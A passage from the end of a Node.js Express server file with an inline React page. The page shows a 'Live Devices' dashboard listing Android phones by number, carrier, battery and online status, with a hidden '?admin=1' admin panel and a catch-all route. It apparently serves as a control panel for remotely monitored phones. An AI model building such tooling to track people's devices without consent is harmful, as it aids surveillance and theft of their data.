                status.broadcast && React.createElement("div", { style: { background: "rgba(245,158,11,0.1)", borderBottom: "1px solid rgba(245,158,11,0.3)", padding: "10px", textAlign: "center", fontSize: "13px", color: "#fbbf24" } }, `📢 ${status.broadcast}`),
                React.createElement("main", { style: { maxWidth: "1200px", margin: "0 auto", padding: "24px" } },
                    React.createElement("div", { style: { display: "flex", justifyContent: "space-between", marginBottom: "20px", flexWrap: "wrap", gap: "10px" } },
                        React.createElement("div", null,
                            React.createElement("h1", { style: { fontSize: "20px", fontWeight: 800 } }, "Live Devices"),
                            lastSync && React.createElement("div", { style: { fontSize: "11px", color: "#555", marginTop: "4px", display: "flex", alignItems: "center", gap: "4px" } }, React.createElement(Icon, { name: "clock", size: 10 }), ` Synced ${formatTime(lastSync)}`)
                        ),
                        React.createElement("div", { style: { display: "flex", gap: "8px", flexWrap: "wrap" } },
                            React.createElement("span", { className: "badge badge-green" }, `${devices.filter(d => d.status).length} Online`),
                            React.createElement("span", { className: "badge badge-red" }, `${devices.filter(d => !d.status).length} Offline`)
                        )
                    ),
                    React.createElement("div", { style: { display: "flex", gap: "10px", marginBottom: "16px", flexWrap: "wrap" } },
                        React.createElement("div", { style: { flex: 1, position: "relative", minWidth: "200px" } },
                            React.createElement("div", { style: { position: "absolute", left: "14px", top: "50%", transform: "translateY(-50%)", color: "#555" } }, React.createElement(Icon, { name: "search", size: 16 })),
                            React.createElement("input", { className: "input", placeholder: "Search by name, phone, android...", value: search, onChange: e => setSearch(e.target.value), style: { paddingLeft: "40px" } })
                        ),
                        React.createElement("button", { className: "btn btn-secondary", onClick: () => loadDevices(), disabled: loading }, loading ? React.createElement("div", { className: "spinner" }) : React.createElement(Icon, { name: "refresh", size: 14 }), " Refresh"),
                        React.createElement("button", { className: "btn btn-secondary", onClick: () => setAutoRefresh(!autoRefresh), style: { borderColor: autoRefresh ? "rgba(34,197,94,0.4)" : undefined, color: autoRefresh ? "#4ade80" : undefined } }, React.createElement(Icon, { name: "wifi", size: 14 }), ` Auto ${autoRefresh ? "ON" : "OFF"}`)
                    ),
                    loading ? React.createElement("div", { className: "grid grid-2" }, [...Array(6)].map((_, i) => React.createElement(SkeletonCard, { key: i }))) :
                    filtered.length === 0 ? React.createElement(EmptyState, { message: search ? "No devices match your search" : "No devices online right now" }) :
                    React.createElement("div", { className: "grid grid-2" },
                        filtered.map(d => React.createElement("div", { key: d.id + d._accountName, className: "device-card" },
                            React.createElement("div", { style: { display: "flex", justifyContent: "space-between", marginBottom: "8px" } },
                                React.createElement("div", { style: { fontWeight: 700, fontSize: "13px" } }, d.name),
                                React.createElement("span", { className: `badge ${d.status ? "badge-green" : "badge-red"}` }, d.status ? "Online" : "Offline")
                            ),
                            React.createElement("div", { style: { fontSize: "12px", color: "#888", display: "grid", gridTemplateColumns: "1fr 1fr", gap: "8px" } },
                                React.createElement("div", null, React.createElement("span", { style: { color: "#555" } }, "Android: "), d.android),
                                React.createElement("div", null, React.createElement("span", { style: { color: "#555" } }, "Battery: "), d.battery),
                                React.createElement("div", { onClick: () => { navigator.clipboard.writeText(d.phoneNumber); }, style: { cursor: "pointer" }, title: "Click to copy" },
                                    React.createElement("span", { style: { color: "#555" } }, "Phone: "), d.phoneNumber
                                ),
                                React.createElement("div", null, React.createElement("span", { style: { color: "#555" } }, "Network: "), d.provider)
                            )
                        ))
                    )
                )
            );
        }

        function App() {
            const [adminSession, setAdminSession] = useState(() => DB.get(KEYS.adminSession, null));
            const [showAdmin, setShowAdmin] = useState(false);
            const { toasts, push } = useToast();

            useEffect(() => {
                // ✅ Auto-detect ?admin in URL
                const params = new URLSearchParams(window.location.search);
                if (params.get("admin") === "1" || window.location.pathname.includes("admin")) {
                    setShowAdmin(true);
                }
            }, []);

            let view;
            if (adminSession?.loggedIn) {
                view = React.createElement(AdminDashboard, { onLogout: () => { DB.del(KEYS.adminSession); setAdminSession(null); setShowAdmin(false); }, toast: push });
            } else if (showAdmin) {
                view = React.createElement(AdminLogin, { onSuccess: () => setAdminSession(DB.get(KEYS.adminSession)) });
            } else {
                view = React.createElement(PublicPanel);
            }

            return React.createElement(React.Fragment, null,
                view,
                toasts.map(t => React.createElement("div", { key: t.id, className: `toast ${t.type}` }, t.msg))
            );
        }

        ReactDOM.createRoot(document.getElementById("root")).render(React.createElement(App));
    </script>
</body>
</html>
`;

// ============================================================
// EXPRESS SERVER ROUTES
// ============================================================

// Home Route (Public Panel)
app.get('/', (req, res) => {
    res.send(pageHTML);
});

// Admin Route (Hidden Admin Panel)
app.get('/admin', (req, res) => {
    res.send(pageHTML);
});

// Custom API Route (e.g. /v2/SLJSNSN19AJA)
app.get('*', (req, res) => {
    res.send(pageHTML);
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});
